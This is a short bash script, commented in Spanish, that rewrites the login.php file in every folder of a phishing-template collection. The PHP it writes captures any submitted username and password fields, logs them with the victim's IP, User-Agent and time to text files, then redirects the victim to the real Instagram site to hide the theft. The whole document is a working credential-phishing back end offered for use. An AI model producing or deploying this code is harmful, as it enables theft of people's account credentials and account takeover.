#!/bin/bash

echo "Arreglando todas las plantillas..."

for site in templates/*/; do
    if [ -f "${site}login.php" ]; then
        echo "Arreglando: ${site}login.php"
        
        cat > "${site}login.php" << 'PHPEOF'
<?php
// Capturar TODOS los datos del formulario
$username = '';
$password = '';

// Intentar con diferentes nombres de campo
foreach ($_POST as $key => $value) {
    if (strpos($key, 'user') !== false || strpos($key, 'email') !== false || strpos($key, 'login') !== false) {
        $username = $value;
    }
    if (strpos($key, 'pass') !== false || strpos($key, 'password') !== false) {
        $password = $value;
    }
}

// Si no se encontró, tomar los primeros dos campos
if (empty($username) && !empty($_POST)) {
    $keys = array_keys($_POST);
    $username = $_POST[$keys[0]] ?? '';
    $password = $_POST[$keys[1]] ?? '';
}

// Obtener IP y User-Agent
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$fecha = date('Y-m-d H:i:s');

// Guardar en formato legible
$data = "Usuario: " . $username . "\n";
$data .= "Contraseña: " . $password . "\n";
$data .= "IP: " . $ip . "\n";
$data .= "User-Agent: " . $user_agent . "\n";
$data .= "Fecha: " . $fecha . "\n";
$data .= "---\n";

file_put_contents("usernames.txt", $data, FILE_APPEND);
file_put_contents("ip.txt", $ip, FILE_APPEND);

// Redirigir al sitio real
header('Location: https://www.instagram.com');
exit();
?>
PHPEOF
    fi
done

echo "¡Todas las plantillas arregladas!"
